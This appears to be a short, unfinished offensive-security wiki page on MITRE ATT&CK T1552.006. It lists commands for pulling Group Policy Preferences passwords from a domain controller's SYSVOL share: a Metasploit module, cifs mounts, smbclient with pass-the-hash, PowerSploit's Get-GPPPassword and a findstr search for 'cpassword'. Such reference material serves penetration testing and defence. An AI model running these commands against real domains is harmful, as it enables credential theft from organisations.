---
description: MITRE ATT&CK™ Sub-technique T1552.006
---

# 🛠️ Group Policies Preferences

## Theory

GPP \(Group Policy Preferences\) 

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
msfconsole or manually finding them by mounting and grep, or accessing and manually open everything

```bash
use auxiliary/scanner/smb/smb_enum_gpp
msf auxiliary(smb_enum_gpp) > set RHOSTS $DOMAIN_CONTROLLER
msf auxiliary(smb_enum_gpp) > set SMBDomain $DOMAIN
msf auxiliary(smb_enum_gpp) > set SMBUser $DOMAIN_USER
msf auxiliary(smb_enum_gpp) > set SMBPass $DOMAIN_PASSWORD
msf auxiliary(smb_enum_gpp) > run
```

or manually mount and grep

```bash
# anon
mount -t cifs //$DOMAIN_CONTROLLER/SYSVOL $Mount_target

# auth
mount -t cifs -o username=$DOMAIN_USER,password=$DOMAIN_PASSWORD,domain=$DOMAIN //$DOMAIN_CONTROLLER/SYSVOL/ $Mount_target
```

or manually smbclient from samba suite 

```bash
smbclient //$DOMAIN_CONTROLLER/SYSVOL -U $DOMAIN_USER
```

or smbclient.py from impacket

```bash
# Plaintext password
smbclient.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'

# Pass-the-hash
smbclient.py -hashes $LMhash:$NThash 'DOMAIN'/'USER'@'DOMAINCONTROLLER'

# Use the SYSVOL share
> use SYSVOL
```

then decrypt

gpp decrypt
{% endtab %}

{% tab title="Windows" %}
must run in a authenticated context, see [impersonation](../impersonation.md)

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords

```bash
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

or manually with findstr

```bash
findstr /S /I cpassword \\$DOMAIN_CONTROLLER\sysvol\*.xml
```

or manually with use and open everything

```bash

```
{% endtab %}
{% endtabs %}

